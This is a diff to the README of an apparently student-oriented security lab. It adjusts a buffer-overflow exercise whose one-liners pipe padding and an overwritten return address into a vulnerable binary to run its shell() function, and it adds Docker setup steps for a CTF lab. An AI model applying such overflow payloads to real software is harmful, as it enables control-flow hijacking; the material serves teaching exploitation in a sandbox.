@@ -85,7 +85,7 @@ The Dockerfile is used to build docker image with full required packages for Han
 2. Open terminal<br>
 `$> cd seclabs` <br>
 `$> cd bof` <br>
-4. If you want print out this statement printf("Congration") <br>
+4. If you want print out this statement printf("Congrat") <br>
 `$>echo $(python -c "print('a'*90)") | ./bof3.out` <br>
 ![image](https://github.com/user-attachments/assets/96b54264-7179-46a4-a9ce-463989c2357c)
 5. Run code command. to open visual studio in terminal <br>
@@ -101,6 +101,22 @@ The Dockerfile is used to build docker image with full required packages for Han
 ![image](https://github.com/user-attachments/assets/b52f5476-56e8-4205-8f8a-c3883ccd9be9)
 11. If you want print out this statement printf("You made it! The shell() function is executed\n") <br>
 `$>echo $(python -c "print('a'*128+'\x5b\x84\x04\x08')") | ./bof3.out` <br>
+![image](https://github.com/user-attachments/assets/d61f8663-c9d7-48af-b018-a25c209fa610)
+
+
+## Exercise-Security Lab ctf
+### Prepare for the lab environment:
+The Dockerfile is used to build docker image with full required packages for Hands-On Assembly & Security labs. <br>
+**How to use:**<br>
+1. Install docker on your computer (host machine) <br>
+2. Build the image "img4lab" that comprises all required packages for labs <br>
+`$> docker build -t img4lab .` to build docker image <br>
+3. Run docker container from previously built image <br> 
+`$> docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab` <br>
+`Seclabs` is created inside student's home folder
+
+### Visualize the initial attack idea
+
 
 
 
